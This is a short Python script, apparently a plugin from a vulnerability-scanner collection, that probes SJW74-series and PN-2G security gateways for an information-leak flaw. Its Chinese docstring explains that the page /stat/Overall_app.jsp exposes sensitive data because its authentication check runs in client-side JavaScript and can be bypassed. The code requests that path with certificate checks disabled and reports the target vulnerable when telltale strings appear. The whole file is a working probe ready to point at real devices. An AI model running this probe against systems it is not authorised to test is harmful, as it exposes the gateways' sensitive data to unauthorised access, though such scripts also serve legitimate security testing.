#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: SJW74系列安全网关 和 PN-2G安全网关信息泄露
referer: unknown
author: Lucifer
description: 文件stat/Overall_app.jsp中,禁用js可泄露敏感信息。因为页面采用的js加载请求服务，对身份进行了简单的验证 ，可以绕过。
'''
import sys
import requests
import warnings
from termcolor import cprint

class adtsec_Overall_app_js_bypass_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/stat/Overall_app.jsp"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"include/highCharts/js/highcharts.js" in req.text and r"ExportAppPDFServlet" in req.text:
                cprint("[+]存在SJW74系列安全网关 和 PN-2G安全网关信息泄露漏洞...(低危)\tpayload: "+vulnurl, "green")
            else:
                cprint("[-]不存在adtsec_Overall_app_js_bypass漏洞", "white", "on_grey")

        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = adtsec_Overall_app_js_bypass_BaseVerify(sys.argv[1])
    testVuln.run()